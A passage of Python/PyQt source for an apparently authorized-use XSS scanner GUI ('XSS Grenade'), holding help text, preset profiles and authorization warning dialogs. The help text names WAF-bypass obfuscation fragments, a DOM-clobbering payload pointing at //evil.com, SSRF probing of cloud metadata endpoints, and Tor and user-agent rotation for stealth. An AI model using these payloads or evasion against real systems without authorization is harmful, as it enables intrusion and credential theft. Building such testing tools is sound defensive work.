            "Without them it has nothing to verify — you lose its value.</li>"
            "<li><b style='color:#fff'>Trusted Types without Static JS</b>  →  The TT analyzer "
            "needs to download external <code>.js</code> files to audit "
            "<code>createPolicy()</code> definitions. It works standalone, but Static JS "
            "does the same network work — enable both for reuse.</li>"
            "</ul>"
        )
        tips_text.setWordWrap(True)
        tips_text.setStyleSheet("padding: 6px;")
        tips_layout.addWidget(tips_text)
        v.addWidget(tips_box)

        # ── Technical reference (deeper detail, for power users) ──
        # The plain-English "Settings explained" box above is for everyone; this
        # one goes deeper (request costs, engine internals) for advanced users.
        ref_box = QGroupBox("Technical reference — deeper detail (for power users)")
        ref_box.setStyleSheet(
            f"QGroupBox {{ color: #22c55e; border: 1px solid {theme('border')}; "
            "border-radius: 7px; margin-top: 10px; padding-top: 14px;} "
            "QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px;}"
        )
        ref_layout = QVBoxLayout(ref_box)
        ref_text = QLabel(
            "<table cellpadding='5' style='color:#e8e8e8'>"
            "<tr><td valign='top'><b style='color:#fff'>POST / JSON / Headers</b></td>"
            "<td>Test POST forms, JSON bodies and HTTP headers (Referer, "
            "X-Forwarded-For, User-Agent) as injection vectors.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Fuzzer</b></td>"
            "<td>An adaptive multi-armed bandit generates WAF bypass mutations. "
            "Very strong against modern WAFs, but generates 200+ req/parameter.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>DOM dynamic</b></td>"
            "<td>Launches a Playwright browser, injects a payload and catches "
            "client-side XSS through a real JS engine. Slower, but finds things "
            "that static analysis missed.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Context-aware</b></td>"
            "<td>The scanner first determines where the parameter reflects (script/attr/"
            "html/url) and sends targeted payloads. <b>Always enable</b> — it raises the hit "
            "rate by ~40% and reduces the number of requests.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Stored XSS</b></td>"
            "<td>A POST with a unique marker, then looks for the marker on crawled "
            "pages. Detects stored XSS across different URLs than where the POST was.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Blind XSS (OOB)</b></td>"
            "<td>Out-of-Band detection — the payload calls back to your server "
            "(xss.hunter, Burp Collaborator). Finds XSS in admin panels "
            "where you yourself can't see the response.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>postMessage XSS</b></td>"
            "<td>Looks for vulnerable <code>addEventListener('message')</code> "
            "handlers without origin validation. Specific to SPA applications.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>WebSocket XSS</b></td>"
            "<td>Looks for vulnerable <code>ws.onmessage</code> handlers with DOM sinks. "
            "Specific to real-time applications (chat, trading, collaboration).</td></tr>"
            "<tr><td valign='top'><b style='color:#0d9488'>DOM v6 taint</b></td>"
            "<td><b>v6, runtime.</b> For each page it injects a unique canary into "
            "EVERY query parameter + fragment, opens it in Chromium with injected hooks "
            "and tracks SOURCE→SINK chains (location.*, document.*, URLSearchParams, "
            "postMessage). Finds XSS that a pure HTTP scanner misses (Twitter-style "
            "#! XSS, sudo level19). Cost: ~1-2s/page. Requires playwright.</td></tr>"
            "<tr><td valign='top'><b style='color:#0891b2'>Static JS</b></td>"
            "<td><b>v7, AST.</b> Parses inline <code>&lt;script&gt;</code> blocks and external "
            "<code>.js</code> files via esprima. Tracks tainted variables across "
            "the AST, finds source→sink chains WITHOUT runtime execution. <b>Also finds framework "
            "escape-hatches</b>: <code>dangerouslySetInnerHTML</code> (React), "
            "<code>bypassSecurityTrustHtml/Script/...</code> (Angular), <code>html_tag()</code> "
            "(Svelte). Very fast (~ms/file). Requires esprima.</td></tr>"
            "<tr><td valign='top'><b style='color:#10b981'>Headless verify</b></td>"
            "<td><b>v5, definitive.</b> After the scan, opens high-confidence findings in "
            "Chromium and definitively verifies whether they actually execute JS (captures "
            "the dialog/console with a canary token). The gate verdict becomes either "
            "<code>EXECUTED</code> (a sure bug) or <code>NOT_EXECUTED</code> "
            "(a sure FP). Cost: ~600ms/finding. Requires playwright.</td></tr>"
            "<tr><td valign='top'><b style='color:#d97706'>Trusted Types</b></td>"
            "<td><b>v8, 2026 modern XSS defense.</b> Audits the CSP <code>"
            "require-trusted-types-for</code> + <code>trusted-types</code> directive "
            "+ AST audit of <code>trustedTypes.createPolicy()</code> calls in JS. Detects "
            "<i>silent backdoors</i>: pass-through default policy "
            "(<code>createHTML: s =&gt; s</code>), wildcard <code>trusted-types *</code>, "
            "weak regex sanitization, report-only-only mode. Firefox 148 (2/2026) "
            "enabled the Sanitizer API by default, Google/Stripe run TT in production. "
            "Cost: ~ms/page (offline).</td></tr>"
            "<tr><td valign='top'><b style='color:#ec4899'>Stored round-trip</b></td>"
            "<td><b>v9, multi-canary persistence.</b> For every POST/PUT request "
            "it generates a unique canary token (XSGS_xxx). After the scan it re-crawls "
            "all known pages + common admin paths (/admin, /dashboard, "
            "/wp-admin, /profile, /settings). If a canary ends up in a different URL than "
            "where the POST was → CONFIRMED stored XSS. Severity boost to CRITICAL "
            "in an admin context (full ATO potential). HackerOne 2025: stored XSS "
            "dominates the top reports (Rockstar $1k, Shopify $3k, TikTok). No "
            "free scanner does this properly. <b>Requires Stored XSS</b> "
            "(POST canaries must be sent first). "
            "Cost: 1 GET/page after the main scan.</td></tr>"
            "<tr><td valign='top'><b style='color:#7c2d12'>Proto Pollution</b></td>"
            "<td><b>v10, DOMPurify CVE feed + general PP.</b> AST audit detects pollution "
            "<i>sources</i> (lodash.merge / $.extend(true) / deepmerge / unsafe for-in) "
            "and pollution <i>gadgets</i> (innerHTML/tagNameCheck/transport_url/...). "
            "When a source and a gadget meet on the same page → <b>HIGH chain</b>. "
            "When a source meets a vulnerable DOMPurify version → <b>per-CVE chain</b> "
            "from the data-driven feed (v10.10): CVE-2024-47875 (mXSS via SVG), CVE-2025-26791 "
            "(template literal escape), CVE-2026-41238 (CUSTOM_ELEMENT_HANDLING bypass). "
            "DOMPurify has 24M+ weekly downloads, used by GitHub/Notion/Slack/Discord. "
            "Of all free scanners, only Burp Pro DOM Invader can do this. "
            "Cost: ~ms/page (purely offline AST, no runtime).</td></tr>"
            "<tr><td valign='top'><b style='color:#9333ea'>DOM Clobbering</b></td>"
            "<td><b>v10.4, Intigriti March 2026 CTF threat.</b> A 2026 mainstream "
            "attack vector documented by Cure53. A two-component vulnerability is detected: "
            "<i>(A)</i> a sanitizer (DOMPurify/sanitize-html) without <code>FORBID_ATTR</code> "
            "for <code>name/id/for</code> attributes + <i>(B)</i> JS code reading a property "
            "from an unowned global like <code>window.X.dataset.next</code>. When both "
            "meet on the same page → <b>HIGH chain</b>. The attacker injects "
            "<code>&lt;form name=\"X\" data-next=\"//evil.com\"&gt;</code> through "
            "sanitized input, the browser auto-creates <code>window.X</code> pointing "
            "at the form element, the app reads <code>window.X.dataset.next</code> and gets "
            "an attacker-controlled URL. Bypasses <b>both DOMPurify and CSP</b>. "
            "Of all free scanners, only this tool detects it. "
            "Cost: ~ms/page (purely offline AST, shares JS bundles with PP/Static JS).</td></tr>"
            "<tr><td valign='top'><b style='color:#ea580c'>SSR Hydration</b></td>"
            "<td><b>v10.5, CVE-2026-27902 Svelte 5 + general SSR injection.</b> "
            "A 2026 emerging attack vector documented by NIST and Cure53 in February 2026. "
            "SSR frameworks (Svelte/SvelteKit/Next.js/Nuxt/Remix/Astro) embed JSON state "
            "into the initial HTML for hydration markers. A serialization bug → JSON "
            "breaks out of an HTML comment or <code>&lt;script type=\"application/json\"&gt;</code> "
            "context → XSS exec <b>BEFORE client JS loads</b>. Bypasses CSP-via-meta "
            "(a meta tag CSP isn't enough pre-hydration), bypasses Trusted Types (not active). "
            "4 detection layers: <i>(1)</i> framework fingerprint + version classification "
            "(<code>CVE-2026-27902</code> Svelte 5.53.0-5.53.4, <code>CVE-2026-27125</code> "
            "Svelte 5.x &lt;5.51.5, <code>CVE-2024-45047</code> Svelte &lt;4.2.19), "
            "<i>(2)</i> comment-break detection (<code>&lt;!--{...-->XSS&lt;!--...--&gt;</code> "
            "exact CVE-2026-27902 pattern), <i>(3)</i> &lt;script&gt;-tag JSON breakout "
            "(literal <code>&lt;/script&gt;</code> in JSON body), <i>(4)</i> reflected canary "
            "in hydration JSON. Cost: ~ms/page (regex+text scan, no AST).</td></tr>"
            "<tr><td valign='top'><b style='color:#0891b2'>CSP Bypass</b></td>"
            "<td><b>v10.6, BIGGEST GAP — 94.72%% of deployed CSP policies have a bypass</b> "
            "(Tranco 50k research 2023, still current in 2026). The existing Trusted Types "
            "module checks WHETHER a policy exists — this layer checks whether it's "
            "BYPASSABLE. 6 detection layers: <i>(A)</i> whitelist entries with known "
            "JSONP bypasses (<code>*.googleapis.com</code> hosts JSONP libs, "
            "<code>cdnjs.cloudflare.com</code> old jQuery, <code>*.amazonaws.com</code> "
            "S3 abuse), <i>(B)</i> <code>'unsafe-inline'</code> without nonce/hash, "
            "<code>'unsafe-eval'</code>, missing <code>base-uri</code> / <code>object-src</code>, "
            "<i>(C)</i> nonce reuse detection (2 fetches, 26%% of sites have reuse per Tranco), "
            "<i>(D)</i> meta-tag CSP vs HTTP header (meta is leakable via CSS attribute "
            "selectors, sirdarckcat 2008 technique revived 2025), <i>(E)</i> wildcard "
            "host risk (<code>*.com</code> / <code>*.io</code> ≈ <code>'*'</code>), "
            "<i>(F)</i> CSS injection sinks (<b>CVE-2026-2441</b> — template vars in "
            "<code>&lt;style&gt;</code>). Cost: ~ms/page + 1 extra fetch for nonce-reuse.</td></tr>"
            "<tr><td valign='top'><b style='color:#16a34a'>Adaptive WAF Bypass</b></td>"
            "<td><b>v10.7, WAF-aware adaptive obfuscation pipeline.</b> "
            "The existing <code>waf_bypass_chain()</code> applied only 5 generic mutations "
            "from the 2018 era (swapcase, NULL byte, tab/newline, comment-in-tag, HTML entity). "
            "2025-2026 WAFs need a more modern approach. This layer: <i>(1)</i> 25 "
            "obfuscation templates categorized by technique and target WAF — "
            "regex source split (<code>window[/al/.source+/ert/.source]</code>), "
            "tagged template literals (eval without parens), CSS animation event handlers, "
            "the Akamai flagship bypass (comment poison + regex source + origin arg), "
            "Cloudflare svg newline parser confusion, AWS srcdoc entity bypass. "
            "<i>(2)</i> A per-WAF preferred bypass list — when a WAF is detected "
            "(Cloudflare/Akamai/AWS WAF/Imperva/F5), the engine uses WAF-specific "
            "templates first. <i>(3)</i> Encoding mutations on the original payload "
            "(Unicode escape of keywords, hex entities, mixed-case event handlers). "
            "Pure mutation — no extra HTTP requests, no learning state. "
            "Complementary with the context-aware fuzzer.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Marker parameter</b></td>"
            "<td>Adds a <code>_=xxx</code> cache-buster parameter. Bypasses the CDN "
            "cache, gets a fresh response. A common pattern, doesn't reveal the scanner.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Fast scan (smart payloads)</b></td>"
            "<td>Sends a small deterministic set of ~18 high-signal payloads "
            "(a polyglot covering many contexts, self-firing SVG/IMG, and one "
            "representative per context) instead of the full list. Far fewer "
            "requests with broad coverage \u2014 the single biggest speed lever for "
            "a quick first pass. Respects your custom payload list.</td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>UA rotation every N req</b></td>"
            "<td>A small number (2-3) = more stealth, higher overhead. Higher (10+) = "
            "faster, but predictable. <b>Sweet spot 3-5.</b></td></tr>"
            "<tr><td valign='top'><b style='color:#fff'>Tor circuit every N req</b></td>"
            "<td>Rotates the exit IP. NOTE: Tor has a min. 10s between rotations — faster "
            "calls are ignored. The default of 50 req is reasonable.</td></tr>"
            "<tr><td valign='top'><b style='color:#666'>Param Wordlist  ⚠ disabled</b></td>"
            "<td><b>v10.14, hidden GET parameter discovery — currently DISABLED.</b><br>"
            "<i>Planned purpose:</i> fix the crawler blind spot where "
            "<code>find_param_urls()</code> only finds params linked in HTML. PHP apps "
            "read <code>$_GET['attachment']</code> directly — no link needed. This is the "
            "class of bugs nuclei's <code>top-xss-params</code> template catches.<br>"
            "<i>Why disabled:</i> initial implementation produced too many false positives "
            "(reflected canaries on error/debug pages without exploitable XSS sinks). "
            "A post-reflection exec-context check is needed before this can be turned "
            "back on. The <code>_param_wordlist.py</code> module remains on disk; engine "
            "integration was removed. The checkbox is disabled and has no effect.</td></tr>"
            "</table>"
        )
        ref_text.setWordWrap(True)
        ref_text.setStyleSheet("padding: 4px;")
        ref_layout.addWidget(ref_text)
        v.addWidget(ref_box)

        # v10.65: older reference sections still hardcode #fff/#ccc text
        # (dark-mode only) which vanished on the light paper background. Re-color
        # exactly those tokens to themed values so they read in BOTH palettes.
        # The precise token match ("#fff'" / "#ccc'") can't collide with themed
        # 6-hex values like "#ffffff'", so this is safe. Runs at build and on
        # every theme switch (HELP is rebuilt in _restyle_inline_widgets).
        _strong = theme('fg_strong'); _body = theme('fg'); _mut = theme('fg_muted')
        _neutral = ("#fff'", "#e8e8e8'", "#ccc'", "#666'")
        for _lbl in inner.findChildren(QLabel):
            _t = _lbl.text()
            if any(_tok in _t for _tok in _neutral):
                _lbl.setText(_t.replace("#fff'", _strong + "'")
                               .replace("#e8e8e8'", _body + "'")
                               .replace("#ccc'", _body + "'")
                               .replace("#666'", _mut + "'"))

        v.addStretch()
        return sc

    def _make_help_card(self, title: str, color: str, when: str,
                         config_sections: list, apply_fn) -> QGroupBox:
        """
        One preset card: title + colored status dot, "When to use"
        description, configuration as a single clean column of rows with
        ON/OFF/WARN status pills, and an Apply button.

        v10.14: rebuilt from the old 3-column layout (which clipped long
        values off the right edge) to a single word-wrapping column with
        colored status pills so a pentester sees at a glance what each
        profile enables.
        """
        box = QGroupBox()
        box.setObjectName("help_panel")
        box.setAttribute(Qt.WA_StyledBackground, True)
        layout = QVBoxLayout(box)
        layout.setContentsMargins(18, 16, 18, 16)
        layout.setSpacing(0)

        # ── Header: colored dot + title ──
        head = QHBoxLayout()
        head.setContentsMargins(0, 0, 0, 0)
        head.setSpacing(10)
        dot = QLabel("●")
        dot.setStyleSheet(
            f"color:{color}; font-size:12px; background:transparent;")
        dot.setFixedWidth(14)
        ttl = QLabel(title)
        ttl.setFont(QFont("JetBrains Mono", 13))
        ttl.setStyleSheet(
            f"color:{color}; font-weight:bold; letter-spacing:1px; "
            f"background:transparent;")
        ttl.setWordWrap(True)
        head.addWidget(dot, 0, Qt.AlignVCenter)
        head.addWidget(ttl, 1)
        hw = QWidget()
        hw.setLayout(head)
        hw.setStyleSheet("background:transparent;")
        layout.addWidget(hw)
        layout.addSpacing(8)

        # ── "When to use" ──
        when_label = QLabel(
            f"<b style='color:{theme('fg')}'>When to use:</b> "
            f"<span style='color:{theme('fg_muted')}'>{when}</span>")
        when_label.setWordWrap(True)
        when_label.setStyleSheet(
            "font-size:12px; background:transparent; padding-left:24px;")
        layout.addWidget(when_label)
        layout.addSpacing(14)

        # ── Status pill helper ──
        def _split_status(raw: str):
            """'ON  every 4 req' → ('ON', 'every 4 req'). Recognised
            heads: ON / OFF / WARN. Anything else (numbers like '15',
            '0.05s') becomes a VALUE pill with no separate note."""
            s = (raw or "").strip()
            for head in ("WARN", "OFF", "ON"):
                if s == head:
                    return head, ""
                if s.startswith(head + " "):
                    return head, s[len(head):].strip(" ()")
            # Numeric / freeform value (Threads=15, Sleep=0.05s)
            return "VALUE", s

        if active_theme_name() == "light":
            _PILL = {
                "ON":    ("#dcfce7", "#15803d"),
                "OFF":   ("#e6e8ec", "#6b7280"),
                "WARN":  ("#fef3c7", "#b45309"),
                "VALUE": ("#dbeafe", "#1d4ed8"),
            }
        else:
            _PILL = {
                "ON":    ("#16331f", "#4ade80"),
                "OFF":   ("#2a2d35", "#9ca3af"),
                "WARN":  ("#3a2f17", "#fbbf24"),
                "VALUE": ("#1d2733", "#7dd3fc"),
            }

        for section_title, rows in config_sections:
            card = QWidget()
            card.setObjectName("help_section")
            card.setAttribute(Qt.WA_StyledBackground, True)
            cardv = QVBoxLayout(card)
            cardv.setContentsMargins(14, 12, 14, 12)
            cardv.setSpacing(0)

            sh = QLabel(section_title.upper())
            sh.setFont(QFont("JetBrains Mono", 10))
            sh.setStyleSheet(
                f"color:{color}; font-weight:bold; letter-spacing:1px; "
                f"background:transparent; border:none;")
            cardv.addWidget(sh)
            cardv.addSpacing(10)

            for setting, value in rows:
                head_kw, note = _split_status(value)
                bg, fg = _PILL.get(head_kw, _PILL["VALUE"])

                row = QHBoxLayout()
                row.setContentsMargins(0, 0, 0, 0)
                row.setSpacing(10)

                pill = QLabel(head_kw if head_kw != "VALUE" else note)
                pill.setStyleSheet(
                    f"background:{bg}; color:{fg}; font-size:10px; "
                    f"font-weight:bold; padding:2px 8px; "
                    f"border-radius: 7px; border:none;")
                pill.setAlignment(Qt.AlignCenter)
                if head_kw == "VALUE":
                    # Numeric/freeform (15, 0.05s, 200) — size to content,
                    # never wrap (wrapping split "0.05s" into "0." / "05s").
                    pill.setWordWrap(False)
                    pill.setMinimumWidth(40)
                    pill.setSizePolicy(QSizePolicy.Maximum,
                                       QSizePolicy.Fixed)
                else:
                    pill.setFixedWidth(46)
                    pill.setWordWrap(False)

                if head_kw == "VALUE":
                    txt_html = (
                        f"<span style='color:{theme('fg')}'>{setting}</span>")
                else:
                    note_html = (
                        f" <span style='color:{theme('fg_muted')}'>— {note}</span>"
                        if note else "")
                    txt_html = (
                        f"<span style='color:{theme('fg')}'>{setting}</span>"
                        f"{note_html}")
                txt = QLabel(txt_html)
                txt.setFont(QFont("JetBrains Mono", 10))
                txt.setStyleSheet(
                    "font-size:12px; background:transparent; border:none;")
                txt.setWordWrap(True)
                txt.setTextInteractionFlags(Qt.TextSelectableByMouse)

                row.addWidget(pill, 0, Qt.AlignTop)
                row.addWidget(txt, 1)
                rw = QWidget()
                rw.setLayout(row)
                rw.setStyleSheet("background:transparent;")
                cardv.addWidget(rw)
                if (setting, value) != rows[-1]:
                    cardv.addSpacing(8)

            layout.addWidget(card)
            layout.addSpacing(10)

        # ── Apply button ──
        btn = QPushButton("Apply this profile")
        btn.setCursor(Qt.PointingHandCursor)
        btn.setStyleSheet(
            f"QPushButton {{ background: {color}; color: #04130a; "
            f"font-weight: bold; padding: 9px 24px; border: none; "
            f"border-radius: 9px; font-size: 12px; }} "
            f"QPushButton:hover {{ background: #ffffff; color:#000; }}"
        )
        btn.clicked.connect(apply_fn)
        layout.addSpacing(2)
        layout.addWidget(btn, alignment=Qt.AlignLeft)

        return box

    # ── v10.14: Destructive testing warning dialog ──────────────────────────
    def _handle_ssrf_checkbox_click(self):
        """v10.15: Při zaškrtnutí SSRF checkboxu zobrazí autorizační
        warning dialog. SSRF je aktivní vektor (nutí cíl dělat requesty
        na interní/cloud zdroje). Cancel/zavření → checkbox zpět na off.
        """
        if not self.ck_ssrf.isChecked():
            return

        msg = QMessageBox(self)
        msg.setIcon(QMessageBox.Warning)
        msg.setWindowTitle("⚠ SSRF SCAN — AUTHORIZATION REQUIRED")
        msg.setText(
            "<b>WARNING:</b> The SSRF scan is an <b>ACTIVE</b> test. It "
            "forces the <b>target server</b> to make outbound requests "
            "you control.<br><br>"
        )
        msg.setInformativeText(
            "Enabling this makes the target attempt to fetch:<br>"
            "&nbsp;&nbsp;• Cloud metadata endpoints "
            "(AWS/GCP/Azure 169.254.169.254) — may expose credentials<br>"
            "&nbsp;&nbsp;• Internal services (redis, SSH, elasticsearch, "
            "couchdb, memcached)<br>"
            "&nbsp;&nbsp;• IP-encoding / localhost bypass variants<br><br>"
            "This traffic <b>may trigger IDS / cloud security alerts</b> "
            "and, on shared hosting or tightly-scoped engagements, may "
            "<b>exceed your authorization scope</b>.<br><br>"
            "<b>I confirm that:</b><br>"
            "&nbsp;&nbsp;1. I have <b>EXPLICIT PERMISSION</b> to perform "
            "active SSRF testing against this target<br>"
            "&nbsp;&nbsp;2. The target is <b>AUTHORIZED</b> (my own "
            "servers, bug bounty with in-scope authorization, contracted "
            "penetration testing)<br>"
            "&nbsp;&nbsp;3. <b>Use at my own risk</b> — the authors of "
            "XSS Grenade <b>ACCEPT NO LIABILITY</b> for any impact<br>"
            "&nbsp;&nbsp;4. Unauthorized testing may constitute a "
            "<b>criminal offense</b> under computer-misuse laws "
            "(CFAA in the US, Computer Misuse Act in the UK, § 230 "
            "Criminal Code in the Czech Republic, and equivalents)"
        )
        msg.setStandardButtons(QMessageBox.Yes | QMessageBox.Cancel)
        msg.setDefaultButton(QMessageBox.Cancel)
        yes_btn = msg.button(QMessageBox.Yes)
        yes_btn.setText("I understand and AGREE")
        cancel_btn = msg.button(QMessageBox.Cancel)
        cancel_btn.setText("Cancel")
        yes_btn.setStyleSheet(
            "QPushButton { background: #b35900; color: white; "
            "font-weight: bold; padding: 6px 12px; }"
            "QPushButton:hover { background: #cc6600; }"
        )

        result = msg.exec_()

        if result != QMessageBox.Yes:
            self.ck_ssrf.setChecked(False)
            self._log_to_console(
                "[ssrf] Authorization declined — SSRF scan remains "
                "DISABLED.", "info",
            )
        else:
            self._log_to_console(
                "⚠ SSRF SCAN ENABLED — only authorized targets! "
                "Active probing of internal/cloud resources.", "warning",
            )

    def _handle_destructive_checkbox_click(self):
        """Při zaškrtnutí destructive checkboxu zobrazí warning dialog
        vyžadující explicitní potvrzení autorizace. Pokud user dá Cancel
        nebo zavře dialog, checkbox se vrátí do unchecked stavu.
        """
        # Pokud user OD-škrtl checkbox (z checked → unchecked), žádný
        # dialog nepotřebujeme, jen necháme to být.
        if not self.ck_destructive.isChecked():
            return

        # Warning dialog
        msg = QMessageBox(self)
        msg.setIcon(QMessageBox.Warning)
        msg.setWindowTitle("⚠ DESTRUCTIVE TESTING — AUTHORIZATION REQUIRED")
        msg.setText(
            "<b>WARNING:</b> Enabling this checkbox activates destructive "
            "tests with <b>PERSISTENT IMPACT</b> on the target server.<br><br>"
        )
        msg.setInformativeText(
            "These tests leave permanent traces on the server and may:<br>"
            "&nbsp;&nbsp;• Cache an XSS payload for <b>ALL</b> visitors "
            "of the page (cache poisoning)<br>"
            "&nbsp;&nbsp;• Trigger emails containing attacker-controlled "
            "links (password reset poisoning)<br>"
            "&nbsp;&nbsp;• Store an XSS payload in logs / admin panel "
            "(stored XSS via headers)<br>"
            "&nbsp;&nbsp;• Affect other users of the target<br><br>"
            "<b>I confirm that:</b><br>"
            "&nbsp;&nbsp;1. I have <b>EXPLICIT PERMISSION</b> from the "
            "target's owner to perform destructive testing<br>"
            "&nbsp;&nbsp;2. I am only testing <b>AUTHORIZED</b> targets "
            "(bug bounty programs with in-scope authorization, my own "
            "servers, contracted penetration testing)<br>"
            "&nbsp;&nbsp;3. <b>Use at my own risk</b> — the authors of "
            "XSS Grenade <b>ACCEPT NO LIABILITY</b> for any damages, "
            "data loss, legal consequences, or any other impact "
            "resulting from the use of these tests<br>"
            "&nbsp;&nbsp;4. Unauthorized testing may constitute a "
            "<b>criminal offense</b> under computer-misuse laws in most "
            "jurisdictions (e.g. Computer Fraud and Abuse Act in the US, "
            "Computer Misuse Act in the UK, § 230 Criminal Code in the "
            "Czech Republic, and equivalents elsewhere)"
        )
        msg.setStandardButtons(QMessageBox.Yes | QMessageBox.Cancel)
        msg.setDefaultButton(QMessageBox.Cancel)
        # Custom button texts
        yes_btn = msg.button(QMessageBox.Yes)
        yes_btn.setText("I understand and AGREE")
        cancel_btn = msg.button(QMessageBox.Cancel)
        cancel_btn.setText("Cancel")

        # Style yes button as warning red
        yes_btn.setStyleSheet(
            "QPushButton { background: #aa0000; color: white; "
            "font-weight: bold; padding: 6px 12px; }"
            "QPushButton:hover { background: #cc0000; }"
        )

        result = msg.exec_()

        if result != QMessageBox.Yes:
            # User dal Cancel nebo zavřel dialog → odškrtni checkbox zpět
            self.ck_destructive.setChecked(False)
            self._log_to_console(
                "[destructive] Authorization declined — destructive "
                "testing remains DISABLED.",
                "info",
            )
        else:
            # Souhlas — log do konzole + zvýraznit
            self._log_to_console(
                "⚠ DESTRUCTIVE TESTING ENABLED — only authorized targets! "
                "On your own risk. No liability for damages.",
                "warning",
            )

    def _log_to_console(self, msg: str, level: str = "info"):
        """Helper pro log do konzole (defensive — pokud console widget
        neexistuje, prostě nedělá nic).
        """
        try:
            if hasattr(self, "console") and self.console is not None:
                color = {"info": "#888888", "warning": "#ff8800",
                         "error": "#ff5555"}.get(level, "#888888")
                self.console.append(
                    f'<span style="color:{color};">{msg}</span>'
                )
        except Exception:
            pass

    # ── Preset appliers — DETERMINISTIC: each preset sets EVERY toggle ──

    def _count_toggles(self) -> int:
        """Number of toggle checkboxes in the UI. Dynamic — stays correct as new
        toggles are added, so the preset status message never goes stale."""
        return sum(1 for n in dir(self)
                   if n.startswith("ck_")
                   and isinstance(getattr(self, n, None), QCheckBox))

    def _apply_extended_toggles(self, aggressive: bool):
        """v10.59: set the CLI-parity + new-vector toggles too, so a preset
        configures EVERY toggle (not just the historical set) — keeps the
        'deterministic preset' contract. `aggressive` (bounty/fast) turns on the
        extra opt-in scan vectors; stealth presets (waf/recon) leave them off."""
        # Header scans — low-noise, engine default-on.
        for ck in (self.ck_cors, self.ck_crlf, self.ck_xssi):
            ck.setChecked(True)
        # Protocol / warm-up defaults.
        self.ck_warmup.setChecked(True)
        self.ck_ua_fresh.setChecked(True)
        self.ck_legacy_tls.setChecked(False)
        # Report formats are user output prefs — presets never force them on.
        for ck in (self.ck_sarif, self.ck_poc, self.ck_evidence):
            ck.setChecked(False)
        # Extra opt-in scan vectors — on for aggressive presets, off for stealth.
        self.ck_markdown.setChecked(aggressive)
        self.ck_css.setChecked(aggressive)
        self.ck_htmx_alpine.setChecked(aggressive)
        self.ck_dompurify_cfg.setChecked(aggressive)
        self.ck_cache_poison.setChecked(aggressive)

    # ── v10.59: competency-focused profiles ──────────────────────────────────
    # Best-practice profiles that map to the tool's distinct STRENGTHS (one
    # vulnerability class per profile) rather than an engagement style. Each
    # starts from a clean slate (every toggle deterministically set) and enables
    # EXACTLY the vectors that class needs — a fast, low-noise, focused scan.

    def _preset_clean_slate(self):
        """Deterministic baseline for a focus profile: turn EVERY toggle off,
        then set the safe always-on defaults. The caller enables just its
        goal-specific vectors. Keeps the 'preset sets every toggle' contract."""
        for _n in dir(self):
            if _n.startswith("ck_"):
                _ck = getattr(self, _n, None)
                if isinstance(_ck, QCheckBox):
                    _ck.setChecked(False)
        # Safe on-by-default baseline (session hygiene + low-noise header checks).
        for _ck in (self.ck_ssl, self.ck_foll, self.ck_ctx, self.ck_rota,
                    self.ck_mark, self.ck_cors, self.ck_crlf, self.ck_xssi,
                    self.ck_warmup, self.ck_ua_fresh, self.ck_html_report):
            _ck.setChecked(True)
        # Anti-detection / performance defaults (a focus profile is not stealth-
        # tuned; the WAF preset is for that).
        self.sp_ua_rot.setValue(5)
        self.ck_tor.setChecked(False)
        self.ck_tor_iso.setChecked(False)
        self.sp_wrk.setValue(12)
        self.sp_sl.setValue(0.05)
        self.sp_to.setValue(10)
        self.sp_dep.setValue(2)
        self.sp_mp.setValue(200)

    def _finish_focus_preset(self, name: str, note: str = ""):
        _n = self._count_toggles()
        msg = f"Preset applied: {name}  —  {_n}/{_n} toggles set"
        if note:
            msg += f"  ·  {note}"
        self.sb.showMessage(msg, 6000)
        self.tabs.setCurrentIndex(5)  # Settings tab

    def _apply_preset_dom(self):
        """DOM-based / SPA XSS — the sink lives in client-side JS."""
        self._preset_clean_slate()
        for ck in (self.ck_dom_v6, self.ck_static_js, self.ck_sourcemap,
                   self.ck_dom, self.ck_headless):
            ck.setChecked(True)
        self.sp_to.setValue(12)          # headless pages are slower
        self._finish_focus_preset(
            "DOM-based / SPA (client-side)",
            "needs Playwright/Chromium — set Stored/API off, hunt JS sinks")

    def _apply_preset_stored(self):
        """Stored / persistent XSS — marker via POST, hunt it elsewhere."""
        self._preset_clean_slate()
        for ck in (self.ck_post, self.ck_stored, self.ck_stored_roundtrip,
                   self.ck_blind, self.ck_cache_poison):
            ck.setChecked(True)
        self._finish_focus_preset(
            "Stored / persistent XSS",
            "add 'Stored verify URLs' + 'Blind OOB URL' in Advanced · "
            "cache-poisoning included")

    def _apply_preset_framework(self):
        """Modern-framework client bugs — mostly offline over the crawl cache."""
        self._preset_clean_slate()
        for ck in (self.ck_proto_pollution, self.ck_dom_clobbering,
                   self.ck_trusted_types, self.ck_ssr_hydration,
                   self.ck_csp_bypass, self.ck_static_js, self.ck_dom_v6,
                   self.ck_htmx_alpine, self.ck_dompurify_cfg):
            ck.setChecked(True)
        self._finish_focus_preset(
            "Modern-framework audit (2026 stacks)",
            "offline ~ms/page — Mutation XSS + htmx/Alpine + DOMPurify-config audit")

    def _apply_preset_api(self):
        """API / single-endpoint surface (GraphQL / JSON / JSONP)."""
        self._preset_clean_slate()
        for ck in (self.ck_graphql, self.ck_json, self.ck_jsonp, self.ck_post):
            ck.setChecked(True)
        self._finish_focus_preset(
            "API / single-endpoint (GraphQL + JSON)",
            "GraphQL is read-only (queries only, never mutations)")

    def _apply_preset_scriptless(self):
        """CSP-resistant / scriptless exfiltration."""
        self._preset_clean_slate()
        for ck in (self.ck_css, self.ck_dangling, self.ck_svg):
            ck.setChecked(True)
        self._finish_focus_preset(
            "CSP-resistant / scriptless exfil",
            "works even when a strict CSP blocks all JavaScript")

    def _apply_preset_richtext(self):
        """Rich-text / CMS / Markdown fields."""
        self._preset_clean_slate()
        for ck in (self.ck_markdown, self.ck_stored, self.ck_post):
            ck.setChecked(True)
        self._finish_focus_preset(
            "Rich-text / Markdown (CMS, wikis, comments)",
            "confirms the endpoint renders Markdown before testing")

    def _apply_preset_bounty(self):
        """Bug Bounty — balanced stealth + reasonable speed."""
        # Anti-detection
        self.ck_rota.setChecked(True)
        self.sp_ua_rot.setValue(4)
        self.ck_tor.setChecked(False)
